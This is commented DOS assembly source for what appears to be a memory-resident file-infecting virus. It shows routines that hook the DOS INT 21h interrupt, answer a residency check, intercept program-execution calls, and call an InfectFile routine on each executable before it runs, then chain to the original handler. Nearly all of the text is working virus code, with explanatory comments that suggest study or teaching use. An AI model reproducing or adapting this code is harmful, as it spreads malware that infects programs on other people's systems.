
;----------------------------------------------------------------------------
; Printf
;----------------------------------------------------------------------------
; Description: Displays a string, and goes to the next line. The string should end with a NULL character 0x00
; Arguments:  ds:si: Address of the string to be displayed
; Registers Destroyed: ax
Printf PROC
push bx
mov ah,0Eh ;teletype output
xor bx, bx ;page 0
DISPLAY_CHAR:
lodsb ;get next character
int 10h ;display
test al, al ;end of string?
jne DISPLAY_CHAR
mov al,0Dh ;display carriage return 
int 10h
mov al,0Ah ;  and line feed
int 10h
pop bx
ret
Printf ENDP
;----------------------------------------------------------------------------
; HookISR
;----------------------------------------------------------------------------
; Description: Installs a new interrupt service routine
; Arguments: AL: Interrupt number , SI: Buffer in which to save old ISR address (DWORD) , DX: Address of new ISR
; Registers Destroyed: ax, bx, es
HookISR PROC
mov ax, 3521h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
int 21h ;Get Address of Old ISR  --> Call DOS  (Current interrupt handler returned in ES:BX)
mov word ptr [si], bx ;Save it
mov word ptr [si+2], es
;lea dx, myint21h ; Load DX with the offset address of the start of this TSR program (the virus body) dx is a input
mov ax, 2521h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
int 21h
ret
HookISR ENDP
;----------------------------------------------------------------------------
; NewDosISR
;----------------------------------------------------------------------------
; Description: Replacment ISR for DOS INT 21h--> after hook the ISR This routine will take place
; Arguments: <none>
; Registers Destroyed: <none>
NewDosISR PROC
pushf ; push the flags reg
cmp ax, nVirusID ;routine to check residency of virus?
jne NOT_VIRUS_CHECK
popf ;because we pushed the flags before comparing
xchg ax, bx ;tell calling program that we're resident --> exchange data ax and bx
iret ;return, since we don't have to call old ISR --> Interrupt Return 
;iret pops CS, the flags register, and the instruction pointer from the stack and resumes the routine that was interrupted.
NOT_VIRUS_CHECK:
cmp ax, 4B00h ;load and execute file? -->Function 4B00h =Load and Execute Program (EXEC) ,
;Loads a program into memory, creates a new program segment prefix (PSP), and transfers control to the new program.
je EXEC_FN
popf ;because we pushed the flags before comparing
;JUMP TO OLD ISR 
;The following two lines will jump the old ISR
;These lines are equivalent to jmp dwOldExecISR
db 0EAh ;op code for inter segment JMP instruction
dwOldExecISR DD ? ;old ISR address is stored here
EXEC_FN:
popf ;because we pushed the flags before comparing
;SAVE FILENAME ADDRESS 
push bp ;GetRelocation pop bp
GetRelocation bp
mov word ptr[cs:bp+_DX_DS], dx ;DS:DX contains the filename. we must save
mov word ptr[cs:bp+_DX_DS+2], ds ;these, because they will be destroyed after the call to INT 21h
pop bp 
;CALL ROUTINE TO INFECT FILE 
SaveRegisters ;we don't want to mess up, since this is an ISR
push cs
push cs
pop ds ;make DS ...
pop es ;... and ES = CS
cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared.
call InfectFile ;infect the file before it is executed
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
RestoreRegisters ;restore before calling orignal ISR
;CALL OLD ISR 
pushf ;because an iret will pop the flags, CS and IP
DB 2Eh, 0FFh, 1Eh ;op code for CALL FAR CS:[xxxx]
dwOldExecISRVariable DW ? ;address of dwOldExecISR (defined above)
;UPDATE OLD FLAGS ON STACK 
pushf ;this is the IMPORTANT part. we must pass
push bp ;the new flags back, and not the old ones.
push ax
mov bp, sp
mov ax, [bp+4] ;get new flags (which we just pushed 'pushf')
mov [bp+10], ax ;replace the old flags with the new. the stack
pop ax ;initially had FLAGS, CS, IP (in that order)
pop bp
popf
iret
NewDosISR ENDP
